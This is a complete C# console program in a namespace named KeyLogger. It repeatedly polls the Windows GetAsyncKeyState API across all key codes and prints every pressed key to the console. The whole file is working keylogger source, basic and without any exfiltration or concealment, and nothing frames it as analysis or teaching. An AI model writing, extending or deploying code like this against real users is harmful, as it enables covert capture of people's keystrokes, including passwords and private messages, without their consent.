using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
	public static class Program
	{
		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);
		public static void Main(string[] args)
		{
			while (true)
			{
				Thread.Sleep(100);
				for (int i = 0; i < 255; i++)
				{
					int state = GetAsyncKeyState(i);
					if (state != 0)
					{
						Keys key = (Keys)i;
						string message = null;
						if(key == Keys.Space)
						{
							message = " ";
						}
						else if(key != Keys.LButton && key != Keys.RButton)
						{
							message = key.ToString();
						}
						if (!(message is null))
						{
							Console.Write(message);
						}
					}
				}
			}
		}
	}
}